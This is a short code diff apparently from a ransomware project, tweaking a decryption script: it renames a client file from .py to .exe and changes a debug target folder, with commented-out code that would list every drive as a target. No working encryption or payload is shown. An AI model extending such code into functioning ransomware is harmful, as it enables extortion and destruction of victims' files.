@@ -27,7 +27,7 @@ PathList_DEBUG=[]
 
 entry=0
 
-filePath='./Client_after_enc.py'
+filePath='./Client_after_enc.exe'#'./Client_after_enc.exe'
 
 def setDecryptModule(privateKeyAES):
     global DecryptModule
@@ -78,7 +78,7 @@ def listUpTargetDir():
     #        PathList.append(drive)
     #PathList.remove("c:\\")
     #print(f"[DEBUG] PathList: {PathList}")
-    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\molly"]
+    PathList_DEBUG=["E:\\github\\-ransomware3\\최지웅\\test"]
 
 
 def recursiveDecrypt(basepath):
